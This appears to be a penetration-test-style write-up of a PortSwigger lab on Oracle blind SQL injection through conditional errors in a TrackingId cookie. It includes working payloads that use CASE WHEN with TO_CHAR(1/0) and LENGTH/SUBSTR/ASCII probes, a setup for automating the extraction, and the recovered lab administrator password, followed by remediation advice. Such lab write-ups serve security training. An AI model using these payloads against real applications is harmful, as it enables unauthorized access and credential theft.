# SQL Injection – Blind SQL Injection Using Conditional Errors (Oracle)

## 1. Summary

During security testing of the target web application, a Boolean-Based Blind SQL Injection vulnerability using conditional errors was identified in the `TrackingId` cookie parameter of the root (`/`) endpoint.

The application did not directly expose database query results or SQL error messages. However, it was possible to manipulate the backend SQL query using Oracle-specific conditional expressions and deliberately trigger database errors depending on whether a tested condition was TRUE or FALSE.

By observing differences between normal HTTP responses and generic HTTP 500 error responses, the SQL injection vulnerability was confirmed.

Further exploitation using Oracle's `LENGTH()`, `SUBSTR()`, and `ASCII()` functions allowed character-by-character extraction of the administrator's password.

## 2. Vulnerability Type and Affected Endpoint/Parameter

- **Vulnerability type:** SQL Injection (Boolean-Based Blind – Conditional Errors)
- **Database Management System:** Oracle
- **Affected endpoint:** `/`
- **HTTP method:** GET
- **Affected parameter:** `TrackingId` (Cookie)
- **Target URL:** `https://0a2500c404ece5d48082124d00360041.web-security-academy.net/`

## 3. Severity (CVSS)

**Provisional CVSS v3.1 Vector:** `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N`

**Provisional Base Score:** 7.5 (High)

**Rationale:**

- **Attack Vector: Network** – The vulnerability can be exploited remotely through an HTTP request.
- **Attack Complexity: Low** – Exploitation requires modifying the vulnerable cookie parameter and observing response differences.
- **Privileges Required: None** – No additional application privileges were required in the tested scenario.
- **User Interaction: None** – The attacker can trigger the vulnerability directly.
- **Confidentiality: High** – Sensitive information, including the administrator's password, was extracted.
- **Integrity: None** – No data modification was demonstrated.
- **Availability: None** – No denial-of-service impact was demonstrated.

*Note: This is a provisional assessment based on the demonstrated lab impact. Real-world severity should be evaluated according to the application's authentication requirements and actual business impact.*

## 4. Steps to Reproduce

### Step 1: Identify the Injection Point

1. Opened the target application and captured a normal HTTP request.
2. Inspected the request cookies and identified `TrackingId` as a potential SQL injection point.
3. Modified the cookie value and tested SQL conditions to observe application behavior.

Example request:

```http
GET / HTTP/1.1
Host: 0a2500c404ece5d48082124d00360041.web-security-academy.net
Cookie: TrackingId=<original-value>' AND 1=1--; session=<session-value>
```

### Step 2: Confirm the SQL Injection

Initially, tested a TRUE condition:

```sql
' AND 1=1--
```

The application returned its normal response.

Next, tested a FALSE condition:

```sql
' AND 1=2--
```

The application returned a different response.

These initial tests helped identify that the `TrackingId` cookie was influencing the backend SQL query.

### Step 3: Identify the Conditional Error Behavior

Since the application did not provide useful differences in normal page content, conditional errors were used as an alternative Boolean signal.

The following Oracle-specific expression was used:

```sql
' AND (SELECT CASE
    WHEN (1=1) THEN TO_CHAR(1/0)
    ELSE '1'
END FROM dual)='1'--
```

**Explanation:**

- `CASE WHEN` evaluates a specified condition.
- `1=1` evaluates to TRUE.
- `TO_CHAR(1/0)` deliberately triggers a division-by-zero error.
- `ELSE '1'` provides a normal value when the condition is FALSE.
- `FROM dual` uses Oracle's dummy table.

A generic database error response when the condition was TRUE provided a useful signal for subsequent testing.

### Step 4: Determine the Administrator's Password Length

Before extracting individual characters, determined the password length using Oracle's `LENGTH()` function.

Payload:

```sql
' AND (SELECT CASE
    WHEN LENGTH(password)=20 THEN TO_CHAR(1/0)
    ELSE '1'
END FROM users WHERE username='administrator')='1'--
```

**Explanation:**

- `LENGTH(password)` calculates the password length.
- `=20` checks whether the password contains 20 characters.
- If the condition is TRUE, `TO_CHAR(1/0)` triggers a database error.
- If FALSE, the expression returns a normal value.

The password length was successfully identified as **20 characters**.

### Step 5: Extract Password Characters Using ASCII

After identifying the password length, used Oracle's `SUBSTR()` and `ASCII()` functions to extract individual characters.

Example payload:

```sql
' AND (SELECT CASE
    WHEN ASCII(SUBSTR(password,1,1))=48
    THEN TO_CHAR(1/0)
    ELSE '1'
END FROM users WHERE username='administrator')='1'--
```

**Payload breakdown:**

- `SUBSTR(password,1,1)` – Extracts the first character of the administrator's password.
- `ASCII(...)` – Converts the extracted character into its ASCII decimal value.
- `=48` – Checks whether the character's ASCII value is 48 (`0`).
- `TO_CHAR(1/0)` – Triggers a database error if the condition is TRUE.
- `ELSE '1'` – Returns a normal value if the condition is FALSE.

### Step 6: Automate Character Extraction

Used Caido Automate to automate the extraction process.

Configured two numeric payload positions:

1. **Character Position:** Iterated from position 1 to 20.
2. **ASCII Value:** Tested candidate decimal ASCII values from 32 to 126.

Used the Matrix strategy to combine character positions with ASCII candidates.

By identifying the requests that triggered the expected conditional error response, the corresponding ASCII values were recovered for each character position.

### Step 7: Decode the Extracted ASCII Values

Converted the extracted ASCII decimal values into their corresponding characters.

The extracted password was:

```text
0evo16t1bhsuzrx5pe5h
```

This confirmed successful character-by-character extraction of the administrator's password.

## 5. Proof of Concept (Payload and Result)

**Initial TRUE condition:**

```sql
' AND 1=1--
```

**Initial FALSE condition:**

```sql
' AND 1=2--
```

**Password length detection:**

```sql
' AND (SELECT CASE
    WHEN LENGTH(password)=20 THEN TO_CHAR(1/0)
    ELSE '1'
END FROM users WHERE username='administrator')='1'--
```

**ASCII-based character extraction:**

```sql
' AND (SELECT CASE
    WHEN ASCII(SUBSTR(password,1,1))=48
    THEN TO_CHAR(1/0)
    ELSE '1'
END FROM users WHERE username='administrator')='1'--
```

**Extracted password:**

```text
0evo16t1bhsuzrx5pe5h
```

## 6. Impact

Exploitation of this vulnerability could allow an attacker to:

- Extract sensitive database information without directly viewing database query results.
- Retrieve administrator credentials stored in the database.
- Potentially gain unauthorized access to an administrator account.
- Enumerate additional database information depending on the database account's privileges and accessible data.

Although the application did not expose database error details, the difference between normal responses and generic error responses provided an indirect channel for extracting sensitive information.

## 7. Remediation

- Use parameterized queries or prepared statements for all database interactions involving user-controlled input.
- Never concatenate cookie values directly into SQL statements.
- Treat all client-controlled values, including tracking cookies, as untrusted input.
- Apply strict input validation where appropriate.
- Enforce the principle of least privilege for database accounts.
- Store passwords using strong salted password-hashing algorithms such as Argon2id or bcrypt.
- Avoid exposing database errors through application responses.
- Conduct regular code reviews and security testing to identify SQL injection vulnerabilities.
- Use a Web Application Firewall as an additional defensive layer, not as a replacement for secure query construction.

## 8. References

- [OWASP – SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [PortSwigger – Blind SQL Injection](https://portswigger.net/web-security/sql-injection/blind)
- [PortSwigger – Blind SQL Injection with Conditional Errors](https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors)
- [Oracle – SQL Language Reference](https://docs.oracle.com/en/database/oracle/oracle-database/19/sqlrf/)
- [CWE-89 – Improper Neutralization of Special Elements used in an SQL Command](https://cwe.mitre.org/data/definitions/89.html)
